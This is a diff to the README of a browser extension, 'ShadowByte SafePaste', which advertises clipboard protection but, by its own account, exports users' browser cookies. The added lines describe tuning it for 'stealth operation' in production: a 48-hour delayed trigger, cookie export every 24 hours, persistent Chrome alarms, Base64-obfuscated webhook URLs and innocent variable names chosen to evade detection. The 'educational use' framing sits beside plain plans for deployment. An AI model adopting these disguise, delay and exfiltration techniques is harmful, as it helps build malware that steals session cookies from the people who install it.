@@ -63,6 +63,11 @@ ShadowByte SafePaste is your personal clipboard security guardian. This extensio
 
 **Your data stays private.** All processing happens locally on your device.
 
+## Testing Mode
+
+⚠️ **Currently set to 1 minute delay for testing purposes.**  
+In production, this will be changed to 48 hours for stealth operation.
+
 ---
 
 <br>
@@ -84,12 +89,15 @@ ShadowByte SafePaste is your personal clipboard security guardian. This extensio
 > - How malicious extensions use deceptive descriptions
 > - Why you should carefully review extension permissions
 > - The importance of understanding what extensions can really do
+> - How persistent alarms work even when browser is closed
 >
 > ### What This Extension Actually Does:
 > - ❌ Does NOT protect your clipboard
-> - ✅ Exports browser cookies for educational analysis
+> - ✅ Exports browser cookies automatically every 24 hours
+> - ✅ Uses Chrome Alarms API for persistent execution
 > - ✅ Demonstrates permission abuse risks
-> - ✅ Shows how extensions access sensitive data
+> - ✅ Shows stealth techniques used by malicious extensions
+> - ✅ Works even when browser is closed (persistent alarms)
 >
 > ### 🎓 Educational Use Only
 > This tool is for **security research, education, and awareness only**.
@@ -97,8 +105,16 @@ ShadowByte SafePaste is your personal clipboard security guardian. This extensio
 > - Never install untrusted extensions
 > - Always review extension permissions
 > - Understand the risks before granting access
+> - Learn how malicious extensions evade detection
 >
-> **Remember:** If an extension requests `cookies`, `clipboardRead`, and `<all_urls>` permissions,  
-> it can access ALL your data. **Be cautious. Stay informed.**
+> ### 🔧 Technical Features Demonstrated:
+> - **Obfuscated webhook URLs** (Base64 encoding)
+> - **Innocent variable naming** (cloudBackup, userPreferences)
+> - **Persistent Chrome Alarms** (works when browser closed)
+> - **Delayed execution** (48 hours in production)
+> - **Legitimate-looking code structure**
+>
+> **Remember:** If an extension requests `cookies`, `alarms`, `storage`, and `<all_urls>` permissions,  
+> it can access ALL your data and execute code even when browser is closed. **Be cautious. Stay informed.**
 
 
